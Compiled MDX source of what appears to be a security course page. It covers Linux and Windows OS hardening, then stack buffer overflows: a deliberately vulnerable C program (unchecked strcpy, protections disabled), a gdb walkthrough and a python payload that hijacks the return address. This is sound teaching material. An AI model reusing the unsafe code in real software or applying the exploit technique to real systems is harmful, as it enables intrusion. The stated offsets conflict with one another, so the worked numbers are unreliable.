        children: "/proc/sys"
      }), ". Critical security parameters:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# /etc/sysctl.d/99-hardening.conf\n\n# IP spoofing protection\nnet.ipv4.conf.all.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1\n\n# Ignore ICMP redirects (prevents MITM route poisoning)\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.default.accept_redirects = 0\nnet.ipv6.conf.all.accept_redirects = 0\n\n# Ignore source-routed packets\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv6.conf.all.accept_source_route = 0\n\n# Kernel ASLR strength (2 = full randomization)\nkernel.randomize_va_space = 2\n\n# Restrict ptrace (prevents process injection by non-root)\nkernel.yama.ptrace_scope = 1\n\n# Disable core dumps for setuid programs\nfs.suid_dumpable = 0\n\n# Restrict dmesg to root\nkernel.dmesg_restrict = 1\n\n# Protect hardlink/symlink creation\nfs.protected_hardlinks = 1\nfs.protected_symlinks = 1\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Apply: ", (0,jsx_runtime.jsx)(_components.code, {
        children: "sysctl -p /etc/sysctl.d/99-hardening.conf"
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "122-service-management",
      children: "1.2.2 Service Management"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Remove or disable every unnecessary service:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# List all enabled services\nsystemctl list-unit-files --state=enabled\n\n# Disable unnecessary ones\nsystemctl disable avahi-daemon\nsystemctl disable cups\nsystemctl disable bluetooth\nsystemctl disable rpcbind\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "123-selinux-and-apparmor",
      children: "1.2.3 SELinux and AppArmor"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "SELinux"
      }), " (Security-Enhanced Linux) implements Mandatory Access Control (MAC) at the kernel level using labels (contexts). Every file, process, port, and device has a security context. Policies define allowed transitions."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Mode: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "enforcing"
        }), " (block), ", (0,jsx_runtime.jsx)(_components.code, {
          children: "permissive"
        }), " (log only), ", (0,jsx_runtime.jsx)(_components.code, {
          children: "disabled"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Check: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "getenforce"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Setenforce: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "setenforce 1"
        })]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Policy type: targeted (default), MLS, strict"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "AppArmor"
      }), " uses path-based profiles instead of labels. Easier to configure but less granular."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Check AppArmor status\naa-status\n\n# Enforce a profile\naa-enforce /path/to/binary\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "124-file-permissions-and-auditd",
      children: "1.2.4 File Permissions and auditd"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["World-writable files: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "find / -perm -0002 -type f 2>/dev/null"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["SUID/SGID files: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "find / -perm -6000 -type f 2>/dev/null"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["No permission on ", (0,jsx_runtime.jsx)(_components.code, {
          children: "/etc/shadow"
        }), " for non-root: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "chmod 640 /etc/shadow"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "auditd"
      }), " monitors security-relevant events:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "auditctl -w /etc/passwd -p wa -k passwd_changes\nauditctl -w /etc/shadow -p wa -k shadow_changes\nausearch -k passwd_changes\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "125-pam-configuration",
      children: "1.2.5 PAM Configuration"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Pluggable Authentication Modules control authentication policies:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "# /etc/pam.d/common-password\npassword requisite pam_pwquality.so retry=3 minlen=14 difok=3\npassword required pam_unix.so sha512 shadow use_authtok\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "126-ssh-hardening",
      children: "1.2.6 SSH Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "# /etc/ssh/sshd_config\nProtocol 2\nPermitRootLogin no\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 0\nPermitEmptyPasswords no\nAllowUsers alice bob\nCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\nKexAlgorithms curve25519-sha256@libssh.org\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "127-practical-lynis-system-hardening-audit",
      children: "1.2.7 Practical: Lynis System Hardening Audit"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Download and run Lynis:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install Lynis\napt-get install lynis   # or git clone https://github.com/CISOfy/lynis\n\n# Run system audit\nlynis audit system\n\n# Check the report\ncat /var/log/lynis-report.dat | grep \"suggestion\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sample output:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "[+] Firewall\n  - iptables is active\n[+] File systems\n  - Check /etc/fstab for noexec, nodev, nosuid\n[!] Suggestion: Install a PAM module for password strength\n[!] Suggestion: Enable process accounting (acct)\n[!] Suggestion: Set a password on GRUB bootloader\n[!] Suggestion: Configure auditd rules\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "13-windows-hardening",
      children: "1.3 Windows Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "131-security-policy-secpolmsc",
      children: "1.3.1 Security Policy (secpol.msc)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Local Security Policy controls:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Password Policy:"
        }), " Minimum length 14, complexity required, max age 60 days"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Account Lockout Policy:"
        }), " 5 bad attempts, 30-min lockout"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "User Rights Assignment:"
        }), " Deny log on through Remote Desktop Services for Guests"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Security Options:"
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Network access: Do not allow anonymous enumeration of SAM accounts"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Microsoft network server: Digitally sign communications (always)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Shutdown: Clear virtual memory pagefile"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "132-user-account-control-uac",
      children: "1.3.2 User Account Control (UAC)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "UAC prompts for consent or credentials when a program requires admin access:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Set to: \"Always notify\" (highest)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Admin Approval Mode: Enabled"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Only elevate executables that are signed and validated"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "133-windows-defender-configuration",
      children: "1.3.3 Windows Defender Configuration"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Check Defender status\nGet-MpComputerStatus\n\n# Enable real-time monitoring\nSet-MpPreference -DisableRealtimeMonitoring $false\n\n# Enable cloud-delivered protection\nSet-MpPreference -MAPSReporting Advanced\n\n# Set scan parameters\nSet-MpPreference -ScanAvgCPULoadFactor 50\nSet-MpPreference -ExclusionPath \"C:\\Program Files\\TrustedApp\"\n\n# Run a full scan\nStart-MpScan -ScanType FullScan\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "134-applocker-configuration",
      children: "1.3.4 AppLocker Configuration"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "AppLocker enforces allowlist application control:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Create AppLocker rules (PowerShell)\n$rule1 = New-AppLockerPolicy -RuleType Exe -User Everyone -Path \"C:\\Program Files\\*\" -Action Allow\n$rule2 = New-AppLockerPolicy -RuleType Exe -User Everyone -Path \"%WINDIR%\\*\" -Action Allow\n$rule3 = New-AppLockerPolicy -RuleType Exe -User Everyone -Path \"C:\\Trusted\\*\" -Action Allow\n\n# Set enforcement mode\nSet-AppLockerPolicy -Policy $policy -Merge\n\n# Audit only (before full enforcement)\nSet-AppLockerPolicy -Policy $policy -RuleType Exe -Audit\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "135-patch-management-wsus",
      children: "1.3.5 Patch Management (WSUS)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Group Policy → Windows Update → Configure Automatic Updates:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "4 = Auto download and schedule install"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Install during maintenance: Daily at 3 AM"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Specify intranet Microsoft update service location → WSUS server"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "136-practical-sysinternals-suite",
      children: "1.3.6 Practical: Sysinternals Suite"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Sysinternals provides deep Windows introspection tools:"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Process Monitor (procmon.exe):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Filter: Process Name is \"malware.exe\" then Include\nCaptures: Registry, File System, Network, Process/Thread activity\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Autoruns (autoruns.exe):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Shows every autostart location:\n- Registry Run keys\n- Scheduled tasks\n- Services\n- Explorer shell extensions\n- Browser helper objects\n- AppInit DLLs\n- Boot execute\n- Side-by-side manifests\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Practical usage for malware analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Run Autoruns → Hide Microsoft entries → examine suspicious entries"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Run Process Monitor → filter on suspicious process→ capture file/registry/network ops"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Check with Process Explorer → look for DLL injection (View → Lower Pane → DLLs)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "14-os-hardening-checklist",
      children: "1.4 OS Hardening Checklist"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Category"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Linux"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Windows"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Patch Level"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "apt update && apt upgrade"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Update / WSUS"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Account Policies"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PAM pwquality, lockout after 5 failures"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "secpol.msc → password/account lockout"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Firewall"
            })
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "ufw enable"
            }), " or ", (0,jsx_runtime.jsx)(_components.code, {
              children: "iptables"
            })]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Defender Firewall with Advanced Security"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "App Control"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SELinux/AppArmor mandatory profiles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AppLocker or WDAC"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "AV/EDR"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ClamAV + rkhunter + chkrootkit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Microsoft Defender + MDE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Logging"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "auditd + rsyslog → SIEM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Event Log → Event Subscription + SIEM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "File Integrity"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AIDE or Tripwire"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sysinternals Sigcheck, FCIV"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Boot Security"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GRUB password, Secure Boot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure Boot, BitLocker, TPM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Kernel Protections"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "sysctl hardening (aslr, rp_filter, etc.)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exploit Protection in Windows Defender"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Removal"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remove avahi, cups, bluetooth, rpcbind"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remove unused roles/features via Server Manager"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Remote Access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSH key-only, disable root"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RDP via VPN + NLA + restricted users"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "User Restrictions"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No world-writable files, SUID review"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "UAC highest, deny local admin"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-2-buffer-overflows",
      children: "Section 2: Buffer Overflows"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "21-memory-layout-of-a-process",
      children: "2.1 Memory Layout of a Process"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A process's memory is like a multi-story office building:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Text (Code) segment"
        }), " → the blueprints (read-only instructions)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Data segment"
        }), " → permanent filing cabinets (global/static variables)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Heap"
        }), " → flexible storage room that grows on demand (dynamic allocation)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Stack"
        }), " → the desk where you pile papers for the current task (local variables, function frames), grows downward"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "High Address\n+------------------+\n|      Stack       |  ← grows downward (toward lower addresses)\n| (local vars,     |\n|  return addrs)   |\n|------------------|\n|        |         |\n|        v         |\n|        ^         |\n|        |         |\n|------------------|\n|      Heap        |  ← grows upward (toward higher addresses)\n| (malloc/new)     |\n|------------------|\n|  Data Segment    |  ← global/static variables\n|------------------|\n|  Text Segment    |  ← machine code (read-only)\n+------------------+\nLow Address\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "22-stack-buffer-overflow",
      children: "2.2 Stack Buffer Overflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "221-anatomy",
      children: "2.2.1 Anatomy"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " You have a stack of papers on your desk labeled \"buffer[16]\". Someone hands you 50 pages to file. You keep stuffing them into the buffer folder, and they spill over, covering your sticky note that says \"remember to return to the main office (return address)\". When you finish, you look at the sticky note → it's been overwritten with \"go to the attacker's office instead.\""]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A stack buffer overflow occurs when a program writes more data to a stack-allocated buffer than its allocated size. The excess overwrites adjacent memory: saved base pointer, return address, and potentially function arguments."
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "222-vulnerable-c-program",
      children: "2.2.2 Vulnerable C Program"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// vuln.c → compile with: gcc -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c\n#include <stdio.h>\n#include <string.h>\n\nvoid secret_function() {\n    printf(\"YOU WIN! Secret function executed.\\n\");\n}\n\nvoid vulnerable(char *input) {\n    char buffer[64];              // 64-byte buffer on stack\n    printf(\"Buffer at: %p\\n\", buffer);\n    printf(\"Secret function at: %p\\n\", secret_function);\n    strcpy(buffer, input);        // NO bounds check → classic overflow\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <overflow string>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable(argv[1]);\n    printf(\"Normal exit.\\n\");\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Output with overflow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "$ ./vuln AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\nBuffer at: 0xffffd4c0\nSecret function at: 0x08048456\nSegmentation fault (core dumped)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "223-stack-frame-layout-during-execution",
      children: "2.2.3 Stack Frame Layout During Execution"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["When ", (0,jsx_runtime.jsx)(_components.code, {
        children: "vulnerable()"
      }), " is called, the stack looks like:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Before strcpy:\nHigh Address\n+---------------------------+\n| argv, argc (caller args)   | ← main's stack frame\n+---------------------------+\n| return address (to main)  | ← 4 bytes → where vulnerable returns\n+---------------------------+\n| saved EBP (frame pointer) | ← 4 bytes\n+---------------------------+\n| buffer[64]                | ← 64 bytes (local array)\n|  [0..15] [16..31]         |\n|  [32..47] [48..63]        |\n+---------------------------+\nLow Address  ← ESP points here\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "After overflow with 72+ bytes:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "After strcpy with 80 bytes:\nHigh Address\n+---------------------------+\n| AAAAAAAA (bytes 72-79)    | ← overwrites argv/argc area\n+---------------------------+\n| AAAAAAAA (bytes 64-71)    | ← overwrites return address\n+---------------------------+\n| AAAAAAAA (bytes 56-63)    | ← overwrites saved EBP\n+---------------------------+\n| AAAAAAAA (bytes 0-55)     | ← fills buffer\n+---------------------------+\nLow Address\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "224-gdb-walkthrough",
      children: "2.2.4 gdb Walkthrough"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "$ gdb -q ./vuln\nReading symbols from ./vuln...(no debugging symbols found)...done.\n(gdb) disassemble vulnerable\nDump of assembler code for function vulnerable:\n   0x0804840d <+0>:     push   ebp\n   0x0804840e <+1>:     mov    ebp,esp\n   0x08048410 <+3>:     sub    esp,0x58         # allocate 88 bytes (64 for buffer + padding)\n   0x08048413 <+6>:     sub    esp,0x8\n   0x08048416 <+9>:     push   DWORD PTR [ebp+8]  # argv[1]\n   0x08048419 <+12>:    lea    eax,[ebp-0x48]     # buffer at ebp-0x48 (72 bytes below EBP)\n   0x0804841c <+15>:    push   eax\n   0x0804841d <+16>:    call   0x80482e0 <strcpy@plt>\n   0x08048422 <+21>:    add    esp,0x10\n   0x08048425 <+24>:    nop\n   0x08048426 <+25>:    leave\n   0x08048427 <+26>:    ret\nEnd of assembler dump.\n\n(gdb) break *0x08048422\n(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\n\n(gdb) x/20wx $ebp-0x50   # examine stack\n0xffffd478:     0x41414141      0x41414141      0x42424242      0x42424242\n0xffffd488:     0x43434343      0x43434343      0x44444444      0x44444444\n0xffffd498:     0x45454545      0x45454545      0x46464646      0x46464646\n0xffffd4a8:     0x47474747      0x47474747      0x48484848      0x48484848\n0xffffd4b8:     0x49494949      0x49494949      ...              ...\n                                ^ buffer          ^ saved EBP     ^ return address\n                                                  (overflowed)     (overflowed)\n\n(gdb) info registers ebp eip\nebp            0x50505050       0x50505050    # overwritten with 'PPPP' (0x50 = 'P')\neip            0x51515151       0x51515151    # overwritten with 'QQQQ' (0x51 = 'Q')\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Finding the offset:"
      }), " Pattern tells us return address offset = 76 bytes (64 buffer + 12 alignment/padding)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "225-exploiting--redirecting-to-secret_function",
      children: "2.2.5 Exploiting → Redirecting to secret_function"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Calculate: buffer(64) + saved_ebp(4) + padding(8) = 76 bytes padding, then target address\n$ ./vuln $(python2 -c 'print \"A\"*76 + \"\\x56\\x84\\x04\\x08\"')\nBuffer at: 0xffffd4c0\nSecret function at: 0x08048456\nYOU WIN! Secret function executed.\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "226-complexity-analysis",
      children: "2.2.6 Complexity Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Crafting:"
        }), " O(n) where n = padding size + address length"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Brute-force (ASLR off):"
        }), " O(1) with known offset"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Brute-force (ASLR on, 32-bit):"
        }), " O(2^16) typical entropy"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Brute-force (ASLR on, 64-bit):"
        }), " O(2^28) typical entropy"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "227-ad-table",
      children: "2.2.7 A&D Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Advantage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantage"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Simple to implement in C"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires precise offset calculation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
